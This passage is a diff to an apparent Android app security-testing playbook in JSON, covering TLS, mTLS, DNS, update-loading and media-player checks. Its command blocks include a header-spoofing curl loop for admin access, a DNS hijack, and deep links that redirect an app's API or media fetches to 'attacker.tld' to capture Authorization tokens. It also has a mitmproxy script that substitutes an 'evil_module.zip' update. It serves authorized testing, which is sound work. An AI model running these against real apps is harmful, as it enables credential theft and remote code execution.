sending its client certificate and the handshake still fails, which reads as\nunbypassable pinning.",
    "proof": "Decrypted first-party traffic plus the console line naming the hooked class (e.g.\n`Found okhttp3.CertificatePinner, overriding CertificatePinner.check()`). Quote it verbatim; it\nidentifies the library family.",
    "escalation": "Unlocks all of D15. Note the costs of the repack route: the signature changes, existing\nsessions are lost, Play Integrity `appRecognitionVerdict` stops being `PLAY_RECOGNIZED`, and any\nself-signature check fires (→ D21).",
    "ruled_out_when": "Not applicable — but a finding demonstrated **only after you disabled the client's\nown control must say so in the report**, because the client's risk picture includes how hard the\ncontrol was to defeat."
@@ -1933,7 +2008,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "A bundled `.cer`/`.der`/`.pem`/`.crt` names the host it pins in its Subject and SANs. That\nhost is real by construction, even when passive recon never surfaced it.",
-   "how": "```bash\nfind apktool_out/assets apktool_out/res/raw -type f \\\n  \\( -iname \"*.cer\" -o -iname \"*.der\" -o -iname \"*.pem\" -o -iname \"*.crt\" -o -iname \"*.bks\" -o -iname \"*.jks\" \\)\nfor cert in $(find apktool_out -iname \"*.cer\" -o -iname \"*.pem\" -o -iname \"*.crt\"); do\n  echo \"== $cert\"\n  openssl x509 -in \"$cert\" -noout -subject -issuer -dates 2>/dev/null || \\\n  openssl x509 -inform DER -in \"$cert\" -noout -subject -issuer -dates\n  openssl x509 -in \"$cert\" -noout -text 2>/dev/null | grep -E 'DNS:|IP Address:'\ndone\nkeytool -list -v -keystore apktool_out/res/raw/truststore.bks -storetype BKS -storepass '' 2>/dev/null | grep -E 'Owner|DNS'\n```\nThe engagement example from the corpus: `assets/api_<service>_<domain>_com.cer` revealed an\n`api.<service>.<domain>` asset absent from passive recon.",
+   "how": "```bash\nfind $DEC/apktool/assets $DEC/apktool/res/raw -type f \\\n  \\( -iname \"*.cer\" -o -iname \"*.der\" -o -iname \"*.pem\" -o -iname \"*.crt\" -o -iname \"*.bks\" -o -iname \"*.jks\" \\)\nfor cert in $(find $DEC/apktool -iname \"*.cer\" -o -iname \"*.pem\" -o -iname \"*.crt\"); do\n  echo \"== $cert\"\n  openssl x509 -in \"$cert\" -noout -subject -issuer -dates 2>/dev/null || \\\n  openssl x509 -inform DER -in \"$cert\" -noout -subject -issuer -dates\n  openssl x509 -in \"$cert\" -noout -text 2>/dev/null | grep -E 'DNS:|IP Address:'\ndone\nkeytool -list -v -keystore $DEC/apktool/res/raw/truststore.bks -storetype BKS -storepass '' 2>/dev/null | grep -E 'Owner|DNS'\n```\nThe engagement example from the corpus: `assets/api_<service>_<domain>_com.cer` revealed an\n`api.<service>.<domain>` asset absent from passive recon.",
    "proof": "A Subject or SAN naming a host that is not in your recon inventory, then confirmed live\n(`dig`, then a TLS handshake and a request).",
    "escalation": "→ D01. Feed the name into a certificate-transparency search for siblings, then sweep\nthe new host for unauthenticated routes (→ D15).",
    "ruled_out_when": "No certificate or truststore ships in `assets/`/`res/raw`, or every Subject/SAN in\nthem is already in the scope inventory."
@@ -1953,8 +2028,10 @@
     "AM-01"
    ],
    "applies_to": "mTLS-fronted mobile backends terminating at nginx/HAProxy/Envoy",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "backend-api",
+   "requires_tags": [
+    "backend-api"
+   ],
    "maps_to": "corpus `hunt-tls-network` Phase 8 + chain table (\"High, not Critical\" without a demonstrated privileged action); CWE-290-class trust-of-header",
    "record": "",
    "legacy_meta": {},
@@ -1980,7 +2057,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Two halves. (a) Client-side: where does the client certificate and its passphrase live, and\nis it extractable? (b) Server-side: edges commonly terminate mTLS and forward the verdict as a request\nheader the backend trusts. If the edge does not strip client-supplied copies, you spoof a verified\nclient with plain curl and no certificate at all.",
-   "how": "```bash\n# (a) client side\ngrep -rn 'KeyManagerFactory\\|PKCS12\\|\\.p12\\|\\.pfx\\|setClientCertificate\\|onReceivedClientCertRequest\\|KeyChain' jadx_out/sources/\nfind apktool_out -iname '*.p12' -o -iname '*.pfx' -o -iname '*.bks'\n# (b) edge verdict header spoof\nfor combo in \\\n  \"X-SSL-Client-Verify: SUCCESS|X-SSL-Client-S-DN: CN=admin\" \\\n  \"ssl-client-verify: SUCCESS|ssl-client-subject-dn: CN=admin\" \\\n  \"X-Client-Verify: SUCCESS|X-Client-DN: CN=admin,O=target\" \\\n  \"X-Forwarded-Client-Cert: By=spiffe://x;Hash=0;Subject=\\\"CN=admin\\\"\"; do\n  H1=\"${combo%%|*}\"; H2=\"${combo##*|}\"\n  curl -sk \"https://$TARGET/internal/api\" -H \"$H1\" -H \"$H2\" -o /dev/null -w \"%{http_code} $H1\\n\"\ndone\n# also sweep paths that commonly skip mTLS entirely:\nfor p in /health /ping /status /metrics /api/health; do\n  curl -sk -o /dev/null -w \"%{http_code} $p\\n\" \"https://$TARGET$p\"; done\n```",
+   "how": "```bash\n# (a) client side\ngrep -rn 'KeyManagerFactory\\|PKCS12\\|\\.p12\\|\\.pfx\\|setClientCertificate\\|onReceivedClientCertRequest\\|KeyChain' $DEC/jadx/sources/\nfind $DEC/apktool -iname '*.p12' -o -iname '*.pfx' -o -iname '*.bks'\n# (b) edge verdict header spoof\nfor combo in \\\n  \"X-SSL-Client-Verify: SUCCESS|X-SSL-Client-S-DN: CN=admin\" \\\n  \"ssl-client-verify: SUCCESS|ssl-client-subject-dn: CN=admin\" \\\n  \"X-Client-Verify: SUCCESS|X-Client-DN: CN=admin,O=target\" \\\n  \"X-Forwarded-Client-Cert: By=spiffe://x;Hash=0;Subject=\\\"CN=admin\\\"\"; do\n  H1=\"${combo%%|*}\"; H2=\"${combo##*|}\"\n  curl -sk \"https://$TARGET/internal/api\" -H \"$H1\" -H \"$H2\" -o /dev/null -w \"%{http_code} $H1\\n\"\ndone\n# also sweep paths that commonly skip mTLS entirely:\nfor p in /health /ping /status /metrics /api/health; do\n  curl -sk -o /dev/null -w \"%{http_code} $p\\n\" \"https://$TARGET$p\"; done\n```",
    "proof": "A **403 flipping to 200 with authenticated-only content** — not a generic page. Apply the\nBody-Diff Rule: if with-header and without-header both return 200 **and the bodies are byte-identical**,\nthe path was never protected and there is no finding.",
    "escalation": "→ D15 internal API surface. If the client certificate is extractable from the APK, that\nis a separate D18/D22 primitive — file it separately and cross-reference.",
    "ruled_out_when": "The edge strips every known verdict-header spelling (all probes return the baseline\n403/401 with identical bodies), and the client certificate is generated on-device and stored in the\nAndroid Keystore rather than shipped in the APK."
@@ -2029,7 +2106,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Apps re-enable old versions through `SSLContext.getInstance(\"TLSv1.1\")`,\n`SSLSocket.setEnabledProtocols(...)`, or library configuration. MASTG names OkHttp's\n`ConnectionSpec.COMPATIBLE_TLS` specifically as a setting that \"can lead to insecure TLS versions,\nlike TLS 1.1, being enabled by default in certain versions\".",
-   "how": "```bash\ngrep -rnE 'SSLContext\\.getInstance\\(\"(SSL|SSLv3|TLSv1|TLSv1\\.1)\"\\)' jadx_out/sources/\ngrep -rn 'setEnabledProtocols\\|setEnabledCipherSuites' jadx_out/sources/ -A8\ngrep -rn 'ConnectionSpec\\.COMPATIBLE_TLS\\|ConnectionSpec\\.MODERN_TLS\\|connectionSpecs(\\|tlsVersions(\\|cipherSuites(' jadx_out/sources/\ngrep -rn 'DefaultHttpClient' jadx_out/sources/\n```\nAlso flag any explicit cipher list containing `NULL`, `anon`, `EXPORT`, `DES`, `RC4` or `MD5` suites.",
+   "how": "```bash\ngrep -rnE 'SSLContext\\.getInstance\\(\"(SSL|SSLv3|TLSv1|TLSv1\\.1)\"\\)' $DEC/jadx/sources/\ngrep -rn 'setEnabledProtocols\\|setEnabledCipherSuites' $DEC/jadx/sources/ -A8\ngrep -rn 'ConnectionSpec\\.COMPATIBLE_TLS\\|ConnectionSpec\\.MODERN_TLS\\|connectionSpecs(\\|tlsVersions(\\|cipherSuites(' $DEC/jadx/sources/\ngrep -rn 'DefaultHttpClient' $DEC/jadx/sources/\n```\nAlso flag any explicit cipher list containing `NULL`, `anon`, `EXPORT`, `DES`, `RC4` or `MD5` suites.",
    "proof": "The enabled-protocol or cipher list at the call site, confirmed by the negotiated version in\na capture (D14-042). The code site alone is not a finding on most programs.",
    "escalation": "Only meaningful when it enables a downgrade to an interceptable or attackable session —\notherwise it belongs in the graveyard table with the reason stated.",
    "ruled_out_when": "No explicit protocol or cipher list is set anywhere, the app uses\n`ConnectionSpec.MODERN_TLS` or the platform default, and `targetSdk ≥ 35` (Android 15 disallows TLS\n1.0/1.1 for apps targeting it, via Conscrypt)."
@@ -2049,8 +2126,11 @@
     "AM-06"
    ],
    "applies_to": "all",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, mitm",
+   "requires_tags": [
+    "device",
+    "mitm"
+   ],
    "maps_to": "MASTG-TEST-0218, MASWE-0026, MASTG-TECH-0010, MASTG-TOOL-0081",
    "record": "",
    "legacy_meta": {},
@@ -2098,8 +2178,10 @@
     "AM-06"
    ],
    "applies_to": "apps shipping their own OpenSSL/BoringSSL/Conscrypt-standalone/mbedTLS in a `.so`, or a cross-platform framework's stack. The platform floor binds at `targetSdk 35`; bundled stacks are unaffected on **every** version",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "native",
+   "requires_tags": [
+    "native"
+   ],
    "maps_to": "AOSP Conscrypt module (\"Android 15 now disallows TLS 1.0 and 1.1 for apps targeting that version\"), developer.android.com Android 15 behaviour changes \"Restricted TLS Versions\"; MASWE-0026",
    "record": "",
    "legacy_meta": {},
@@ -2125,7 +2207,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "An app that needs a legacy endpoint on a modern target must have installed a custom socket\nfactory or bundled its own TLS stack. Find it — and note that such a stack frequently ships a\npermissive trust manager alongside, which is the actual finding.",
-   "how": "```bash\nunzip -l base.apk | grep -iE 'conscrypt|openssl|boringssl|libssl|mbedtls'\nstrings -a apktool_out/lib/arm64-v8a/*.so | grep -iE 'TLSv1|OpenSSL [0-9]|BoringSSL|mbed TLS' | sort -u\ngrep -rn 'SSLContext.getInstance\\|setEnabledProtocols\\|ConnectionSpec\\|SSLSocketFactory\\|Conscrypt.newProvider' jadx_out/sources/\ngrep -rn 'X509TrustManager\\|HostnameVerifier\\|checkServerTrusted' jadx_out/sources/ -A6   # the co-located defect\nopenssl s_client -connect api.target.tld:443 -tls1_1 </dev/null 2>&1 | grep -E 'Protocol|Cipher'\n```",
+   "how": "```bash\nunzip -l base.apk | grep -iE 'conscrypt|openssl|boringssl|libssl|mbedtls'\nstrings -a $DEC/apktool/lib/arm64-v8a/*.so | grep -iE 'TLSv1|OpenSSL [0-9]|BoringSSL|mbed TLS' | sort -u\ngrep -rn 'SSLContext.getInstance\\|setEnabledProtocols\\|ConnectionSpec\\|SSLSocketFactory\\|Conscrypt.newProvider' $DEC/jadx/sources/\ngrep -rn 'X509TrustManager\\|HostnameVerifier\\|checkServerTrusted' $DEC/jadx/sources/ -A6   # the co-located defect\nopenssl s_client -connect api.target.tld:443 -tls1_1 </dev/null 2>&1 | grep -E 'Protocol|Cipher'\n```",
    "proof": "A captured handshake showing the app completing a TLS 1.0/1.1 session on a device where the\nplatform would have refused it — plus the bundled stack's version string.",
    "escalation": "→ D19 (cross-platform frameworks are the usual cause), → D14-007 if the same stack\ncarries a permissive trust manager.",
    "ruled_out_when": "No bundled TLS library ships in `lib/`, and every observed handshake is TLS 1.2+."
@@ -2145,8 +2227,11 @@
     "AM-06"
    ],
    "applies_to": "apps shipping with Google Play Services; meaningful mainly where `minSdkVersion` is low",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "minsdk<29, legacy",
+   "requires_tags": [
+    "minsdk<29",
+    "legacy"
+   ],
    "maps_to": "MASTG-TEST-0295, MASWE-0027, MASTG-KNOW-0010, MASTG-KNOW-0011, MASTG-BEST-0020",
    "record": "",
    "legacy_meta": {},
@@ -2173,7 +2258,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Three failure modes, and MASTG makes the ordering explicit — \"Check that these calls occur\nbefore any network connections are made\": (a) no `ProviderInstaller` reference at all; (b) a call whose\nexception handler is empty; (c) a call made *after* networking has already started.",
-   "how": "```bash\ngrep -rnE 'ProviderInstaller\\.(installIfNeeded|installIfNeededAsync)|ProviderInstallListener|GooglePlayServicesNotAvailableException|GooglePlayServicesRepairableException' jadx_out/sources/ -A8\n```\nConfirm the ordering at runtime by timestamping both events:\n```javascript\nJava.perform(function () {\n  try { var PI = Java.use('com.google.android.gms.security.ProviderInstaller');\n        PI.installIfNeeded.implementation = function (c) {\n          console.log('[ProviderInstaller.installIfNeeded] t=' + Date.now());\n          return this.installIfNeeded(c); };\n  } catch (e) { console.log('ProviderInstaller absent'); }\n  var U = Java.use('java.net.URL');\n  U.openConnection.overload().implementation = function () {\n    console.log('[URL.openConnection] t=' + Date.now() + ' ' + this.toString());\n    return this.openConnection(); };\n});\n```",
+   "how": "```bash\ngrep -rnE 'ProviderInstaller\\.(installIfNeeded|installIfNeededAsync)|ProviderInstallListener|GooglePlayServicesNotAvailableException|GooglePlayServicesRepairableException' $DEC/jadx/sources/ -A8\n```\nConfirm the ordering at runtime by timestamping both events:\n```javascript\nJava.perform(function () {\n  try { var PI = Java.use('com.google.android.gms.security.ProviderInstaller');\n        PI.installIfNeeded.implementation = function (c) {\n          console.log('[ProviderInstaller.installIfNeeded] t=' + Date.now());\n          return this.installIfNeeded(c); };\n  } catch (e) { console.log('ProviderInstaller absent'); }\n  var U = Java.use('java.net.URL');\n  U.openConnection.overload().implementation = function () {\n    console.log('[URL.openConnection] t=' + Date.now() + ' ' + this.toString());\n    return this.openConnection(); };\n});\n```",
    "proof": "A network-connection timestamp **preceding** the `installIfNeeded` timestamp, an empty\n`catch` block at the call site, or no reference at all on an app whose `minSdkVersion` is low.",
    "escalation": "Pair with D14-027 (low `minSdkVersion`) as one \"the app supports legacy devices and\ndoes not harden their TLS stack\" finding, rated on the app's risk class. Standalone it is Low and\nfrequently Informational.",
    "ruled_out_when": "`installIfNeeded`/`installIfNeededAsync` runs on the first-launch path before any\nconnection (proved by the timestamps), with a handler that surfaces\n`GooglePlayServicesRepairableException`/`NotAvailableException` rather than swallowing it — or\n`minSdkVersion` is high enough that the provider is current on every supported device."
@@ -2193,8 +2278,11 @@
     "AM-06"
    ],
    "applies_to": "all. Android supports DNS-over-TLS from SDK 28 and DoH3 from SDK 30; DNS resolution is the `com.android.resolv` Mainline module",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, mitm",
+   "requires_tags": [
+    "device",
+    "mitm"
+   ],
    "maps_to": "Google risk `bad-dns` (names `DnsResolver`, DoT at SDK 28+, DoH3 at SDK 30+, and the anti-patterns \"Implement custom DNS resolution logic\", \"Configure hardcoded DNS servers\", \"Use unencrypted DNS (plain UDP port 53)\"); ATT&CK T1638; MASWE-0026",
    "record": "",
    "legacy_meta": {},
@@ -2223,7 +2311,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Two things. (a) Does the app resolve through its own resolver, bypassing the user's Private\nDNS setting? (b) When a hostname resolves elsewhere, what does the app do — fall back to HTTP on TLS\nfailure, accept a certificate for a different name because the verifier is lax only on a secondary\nhost, or fetch config/assets from the hijacked name?",
-   "how": "```bash\ngrep -rnE 'DnsResolver|InetAddress\\.getByName|InetAddress\\.getAllByName|okhttp3\\.Dns|dnsjava|dnsOverHttps|doh|8\\.8\\.8\\.8|1\\.1\\.1\\.1' jadx_out/sources/ -B4 -A4\nadb shell settings get global private_dns_mode\nadb shell dumpsys connectivity | grep -iA4 'private dns'\nadb shell cmd package list packages --apex-only | grep resolv\nadb shell su -c '/data/local/tmp/tcpdump -i any -n port 53 -w /sdcard/dns.pcap'\n# hijack a name at the network layer and watch the fallback\ndnsmasq -d --address=/cdn.target.tld/192.168.1.66 --address=/analytics.target.tld/192.168.1.66\nadb logcat | grep -iE 'SSLHandshake|CertPathValidator|UnknownHost|retry|fallback|http://'\n```",
+   "how": "```bash\ngrep -rnE 'DnsResolver|InetAddress\\.getByName|InetAddress\\.getAllByName|okhttp3\\.Dns|dnsjava|dnsOverHttps|doh|8\\.8\\.8\\.8|1\\.1\\.1\\.1' $DEC/jadx/sources/ -B4 -A4\nadb shell settings get global private_dns_mode\nadb shell dumpsys connectivity | grep -iA4 'private dns'\nadb shell cmd package list packages --apex-only | grep resolv\nadb shell su -c '/data/local/tmp/tcpdump -i any -n port 53 -w /sdcard/dns.pcap'\n# hijack a name at the network layer and watch the fallback\ndnsmasq -d --address=/cdn.target.tld/192.168.1.66 --address=/analytics.target.tld/192.168.1.66\nadb logcat | grep -iE 'SSLHandshake|CertPathValidator|UnknownHost|retry|fallback|http://'\n```",
    "proof": "For (a) a plaintext UDP/53 query from the app's UID in the capture while\n`private_dns_mode=hostname` is configured. For (b) the app completing a request against your host for\na name it does not own, or logcat showing an HTTP retry after the TLS failure you induced.",
    "escalation": "→ D14-046 and D17 when the hijacked name serves config, assets or an update. Note that\nAndroid 16's Local Network Protection can itself break this test — record the API level.",
    "ruled_out_when": "All resolution goes through `InetAddress`/the platform resolver with no hardcoded\nservers, the DNS pcap is empty while Private DNS is on, and a hijacked secondary name produces a hard\nTLS failure with no HTTP fallback in logcat."
@@ -2278,7 +2366,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Is the API base URL fixed at build time, or does it come from a remote config, a push\npayload, a deep link, a DNS record, `shared_prefs`, or an algorithm? A mutable base URL is the single\npoint at which an attacker redirects every user's traffic — it is the worst-case version of \"no\npinning\" and should be reported jointly with it.",
-   "how": "```bash\ngrep -rn -iE 'baseUrl|BASE_URL|endpoint|Retrofit\\.Builder|HttpUrl\\.parse|RemoteConfig|getString\\(\"api|FirebaseRemoteConfig' jadx_out/sources/\ngrep -rn -B10 'Retrofit.Builder\\|baseUrl(' jadx_out/sources/ | grep -nE 'getIntent|getQueryParameter|getString|RemoteConfig|prefs'\nadb shell \"run-as <pkg> cat shared_prefs/*.xml\" | grep -i 'http'\n# then change it in flight:\n#   mitmproxy: rewrite the remote-config response's api_base_url to https://attacker.tld\nadb shell am start -a android.intent.action.VIEW -d 'target://config?api=https://attacker.tld'\n```",
+   "how": "```bash\ngrep -rn -iE 'baseUrl|BASE_URL|endpoint|Retrofit\\.Builder|HttpUrl\\.parse|RemoteConfig|getString\\(\"api|FirebaseRemoteConfig' $DEC/jadx/sources/\ngrep -rn -B10 'Retrofit.Builder\\|baseUrl(' $DEC/jadx/sources/ | grep -nE 'getIntent|getQueryParameter|getString|RemoteConfig|prefs'\nadb shell \"run-as <pkg> cat shared_prefs/*.xml\" | grep -i 'http'\n# then change it in flight:\n#   mitmproxy: rewrite the remote-config response's api_base_url to https://attacker.tld\nadb shell am start -a android.intent.action.VIEW -d 'target://config?api=https://attacker.tld'\n```",
    "proof": "The app's next request arriving at **your** host with its `Authorization` header attached —\ncaptured on your listener, not merely observed as a changed preference value.",
    "escalation": "Redirected base URL plus a trusting client is credential harvesting for the whole user\nbase. → D13, D15, D17.",
    "ruled_out_when": "The base URL is a `static final` build constant with no writable override path, no\nremote-config key resolves to a URL, and `shared_prefs` contains no host value that the client reads\nback."
@@ -2300,8 +2388,10 @@
     "AM-09"
    ],
    "applies_to": "all; see D17 for the OTA/dynamic-loading variants",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "mitm",
+   "requires_tags": [
+    "mitm"
+   ],
    "maps_to": "MASWE-0049, CWE-494, MASVS-CODE-4, Mobile Top 10 2024 M2; Google Mobile VRP ACE definition — \"Attacker gaining full control of the application, meaning code can be downloaded from the network and executed\"",
    "record": "",
    "legacy_meta": {},
@@ -2331,7 +2421,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Watch for `.so`, `.dex`, `.jar`, `.zip`, `.apk`, `.js`/Hermes bundle, `.wasm`, model files or\na security-relevant JSON config arriving over the network; then substitute the response and see whether\nthe app loads it without verifying a signature.",
-   "how": "```bash\n# what gets fetched\nmitmdump -w flows.mitm; mitmdump -nr flows.mitm -q | grep -iE '\\.(so|dex|jar|zip|apk|js|bundle|wasm|json)($|\\?)'\n# what loads it\ngrep -rn 'DexClassLoader\\|PathClassLoader\\|InMemoryDexClassLoader\\|System.load\\|System.loadLibrary\\|loadScriptFromFile\\|CodePush\\|expo-updates' jadx_out/sources/\n# is there a signature check on the fetched artefact?\ngrep -rn 'Signature\\.verify\\|MessageDigest\\|PackageManager.GET_SIGNING_CERTIFICATES\\|checkSignatures\\|sha256' jadx_out/sources/ -A6\n```\nThen substitute with mitmproxy and put a marker in the payload:\n```python\ndef response(flow):\n    if flow.request.path.endswith(\"/update/module.zip\"):\n        flow.response.content = open(\"/tmp/evil_module.zip\",\"rb\").read()\n```",
+   "how": "```bash\n# what gets fetched\nmitmdump -w flows.mitm; mitmdump -nr flows.mitm -q | grep -iE '\\.(so|dex|jar|zip|apk|js|bundle|wasm|json)($|\\?)'\n# what loads it\ngrep -rn 'DexClassLoader\\|PathClassLoader\\|InMemoryDexClassLoader\\|System.load\\|System.loadLibrary\\|loadScriptFromFile\\|CodePush\\|expo-updates' $DEC/jadx/sources/\n# is there a signature check on the fetched artefact?\ngrep -rn 'Signature\\.verify\\|MessageDigest\\|PackageManager.GET_SIGNING_CERTIFICATES\\|checkSignatures\\|sha256' $DEC/jadx/sources/ -A6\n```\nThen substitute with mitmproxy and put a marker in the payload:\n```python\ndef response(flow):\n    if flow.request.path.endswith(\"/update/module.zip\"):\n        flow.response.content = open(\"/tmp/evil_module.zip\",\"rb\").read()\n```",
    "proof": "Your substituted payload executing in the app's process — your own log tag appearing in\n`adb logcat --pid $(adb shell pidof <pkg>)`, or your file written to the app's data directory. A\nchanged byte count is not proof; execution is.",
    "escalation": "This is the only route in this chapter to a P1. File it as its own submission and\ncross-reference the transport primitive rather than merging them — one fix equals one bounty.",
    "ruled_out_when": "Every downloaded artefact is verified against a pinned public key or an embedded\nsignature **before** load, demonstrated by substituting a payload and observing a verification failure\nin logcat with the load aborted."
@@ -2378,7 +2468,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "Google's own guidance is to replace `DownloadManager` with Cronet + WorkManager, citing three\npatched Download Provider CVEs and the fact that it parses destinations with `Uri.parse()`, which\n\"applies minimal validation on untrusted input\". Two questions: does the app attach session headers to\nthe request, and where does the file land before it is used?",
-   "how": "```bash\ngrep -rn 'DownloadManager\\|DOWNLOAD_SERVICE\\|addRequestHeader\\|setDestinationIn\\|setDestinationUri' jadx_out/sources/ -B4 -A8\n# from an unprivileged app / adb as a stand-in for one:\nadb shell content query --uri content://downloads/my_downloads\nadb shell content query --uri content://downloads/all_downloads\n```",
+   "how": "```bash\ngrep -rn 'DownloadManager\\|DOWNLOAD_SERVICE\\|addRequestHeader\\|setDestinationIn\\|setDestinationUri' $DEC/jadx/sources/ -B4 -A8\n# from an unprivileged app / adb as a stand-in for one:\nadb shell content query --uri content://downloads/my_downloads\nadb shell content query --uri content://downloads/all_downloads\n```",
    "proof": "`content query` returning the victim's download rows (URL, title, path) from a process\nholding no permissions, **or** the downloaded artefact landing in a world-accessible external location\nbefore the app consumes it, **or** an `addRequestHeader(\"Cookie\"/\"Authorization\", …)` call site.",
    "escalation": "→ D17 (unverified downloaded code), → D13 (cookie disclosure), → D07 if the\ndestination is a shared provider path another app can write.",
    "ruled_out_when": "The app uses its own HTTP client writing to app-private storage with a signature\ncheck before use, or `DownloadManager` is used only for user-initiated, non-security-relevant media\nwith no auth headers attached."
@@ -2400,8 +2490,10 @@
     "AM-11"
    ],
    "applies_to": "React Native release builds that still ship `DevSupportManager` wiring",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "react-native",
+   "requires_tags": [
+    "react-native"
+   ],
    "maps_to": "React Native `devsupport/DevServerHelper.kt` — bundle URL `\"%s://%s/%s.%s?platform=android&dev=%s&lazy=%s&minify=%s&app=%s&modulesOnly=%s&runModule=%s\"`, inspector `\"%s://%s/inspector/device?name=%s&app=%s&device=%s&profiling=%b\"`, `\"%s://%s/open-debugger?device=%s\"`; MASWE-0049",
    "record": "",
    "legacy_meta": {},
@@ -2426,7 +2518,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "RN's dev support fetches the JS bundle over plain HTTP from a packager host and exposes\ninspector endpoints. If any of that survives into release, the app executes JS from whatever host it\nis pointed at — and the pointer is a `SharedPreferences` value.",
-   "how": "```bash\ngrep -a -nE 'packager|:8081|/index\\.bundle|/open-debugger|/inspector/device|debuggerHost|DevSettings|DevSupportManager' \\\n  <(strings -a apktool_out/assets/index.android.bundle) jadx_out/sources/ 2>/dev/null\nadb shell \"run-as <pkg> cat shared_prefs/*.xml\" | grep -i 'debug_http_host\\|dev_settings'\nadb logcat | grep -iE 'ReactNative|DevServer|packager'\nadb shell am start -a android.intent.action.VIEW -d \"<scheme>://\" <pkg>   # then watch for :8081 traffic\n```",
+   "how": "```bash\ngrep -a -nE 'packager|:8081|/index\\.bundle|/open-debugger|/inspector/device|debuggerHost|DevSettings|DevSupportManager' \\\n  <(strings -a $DEC/apktool/assets/index.android.bundle) $DEC/jadx/sources/ 2>/dev/null\nadb shell \"run-as <pkg> cat shared_prefs/*.xml\" | grep -i 'debug_http_host\\|dev_settings'\nadb logcat | grep -iE 'ReactNative|DevServer|packager'\nadb shell am start -a android.intent.action.VIEW -d \"<scheme>://\" <pkg>   # then watch for :8081 traffic\n```",
    "proof": "The app issuing a request to\n`http://<host>:8081/index.bundle?platform=android&dev=true&…` from a release build, or a reachable\n`/open-debugger` / `/inspector/device` endpoint — then your served bundle executing (log a marker from\nit).",
    "escalation": "→ D19 (RN internals), → D17. This is a full ACE with a cleartext delivery path.",
    "ruled_out_when": "`strings` on the release bundle and the DEX contains no packager/inspector URL\nformat strings, `shared_prefs` holds no `debug_http_host`, and a cold start with a hostile DNS answer\nfor the packager name produces no :8081 request."
@@ -2472,7 +2564,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "`MediaItem.DrmConfiguration.Builder.setLicenseRequestHeaders()` attaches app headers —\ncommonly `Authorization` — to the licence request, and `setLicenseUri()` is frequently taken from the\nmanifest, the playback API response, or a deep-link parameter. The licence request goes out on the DRM\nstack's own HTTP client, **outside the app's pin set**, because NSC pins are usually declared\nper-domain rather than on `base-config`.",
-   "how": "```bash\ngrep -rnE 'setLicenseUri|setLicenseRequestHeaders|DrmConfiguration|setForceDefaultLicenseUri|HttpMediaDrmCallback|setDrmSessionManagerProvider|DrmSessionManagerProvider' jadx_out/sources/\ngrep -rn -B10 'setLicenseUri' jadx_out/sources/ | grep -nE 'getIntent|getQueryParameter|response\\.|json'\ngrep -n 'domain-config\\|base-config' apktool_out/res/xml/network_security_config.xml\n```\nThen start playback with a manifest or playback response you control and observe the licence POST.",
+   "how": "```bash\ngrep -rnE 'setLicenseUri|setLicenseRequestHeaders|DrmConfiguration|setForceDefaultLicenseUri|HttpMediaDrmCallback|setDrmSessionManagerProvider|DrmSessionManagerProvider' $DEC/jadx/sources/\ngrep -rn -B10 'setLicenseUri' $DEC/jadx/sources/ | grep -nE 'getIntent|getQueryParameter|response\\.|json'\ngrep -n 'domain-config\\|base-config' $DEC/apktool/res/xml/network_security_config.xml\n```\nThen start playback with a manifest or playback response you control and observe the licence POST.",
    "proof": "A licence `POST` arriving at **your** host with the app's `Authorization: Bearer …` header —\nthen replay that token against the main API and show a 200 on `/me`. Two captures, one chain.",
    "escalation": "→ D13 account access. The same stack also fetches keys named by an HLS `EXT-X-KEY` URI\n— test that path with the same method.",
    "ruled_out_when": "`setLicenseUri` is a build constant, `setLicenseRequestHeaders` carries no\ncredential (or a scoped, short-lived playback token), and the licence host is inside the pin set /\n`base-config`."
@@ -2519,7 +2611,7 @@
    "has_code": true,
    "skip_when": "",
    "test": "If a deep link, push payload, chat message, scanned QR or WebView bridge can set the player's\nmedia URL, the media stack fetches an attacker host with the app's cookies, User-Agent and possibly\n`Authorization` — and then parses attacker-controlled container and subtitle bytes in native code.",
-   "how": "```bash\ngrep -rnE 'MediaItem\\.fromUri|setMediaItem|createMediaSource|HlsMediaSource|DashMediaSource|ProgressiveMediaSource|setSubtitleConfigurations|DefaultHttpDataSource|setDefaultRequestProperties' jadx_out/sources/\ngrep -rn -B12 'MediaItem.fromUri' jadx_out/sources/ | grep -nE 'getIntent|getQueryParameter|extras|push'\nadb shell am start -a android.intent.action.VIEW \\\n  -d 'target://play?src=https://attacker.tld/evil.m3u8&sub=https://attacker.tld/a.vtt'\n```",
+   "how": "```bash\ngrep -rnE 'MediaItem\\.fromUri|setMediaItem|createMediaSource|HlsMediaSource|DashMediaSource|ProgressiveMediaSource|setSubtitleConfigurations|DefaultHttpDataSource|setDefaultRequestProperties' $DEC/jadx/sources/\ngrep -rn -B12 'MediaItem.fromUri' $DEC/jadx/sources/ | grep -nE 'getIntent|getQueryParameter|extras|push'\nadb shell am start -a android.intent.action.VIEW \\\n  -d 'target://play?src=https://attacker.tld/evil.m3u8&sub=https://attacker.tld/a.vtt'\n```",
    "proof": "Your host receiving the manifest/segment/subtitle request **with the app's headers**;\nsecond proof is the app rendering attacker-supplied subtitle content, or crashing in the native\ndemuxer on a malformed segment (capture the tombstone).",
    "escalation": "→ D09 (deep-link entry point), → D16 (attacker bytes into a native demuxer is a\n0-click media-decode class with a first-party delivery path), → D13 if the fetch carries auth.",
    "ruled_out_when": "Every media URL originates from a signed/first-party API response and is validated\nagainst a host allow-list before `MediaItem.fromUri`, and the deep-link probe above produces no\noutbound request to the attacker host."
@@ -2539,8 +2631,11 @@
     "AM-06"
    ],
    "applies_to": "all",
-   "requires": "",
-   "requires_tags": [],
+   "requires": "device, mitm",
+   "requires_tags": [
+    "device",
+    "mitm"
+   ],
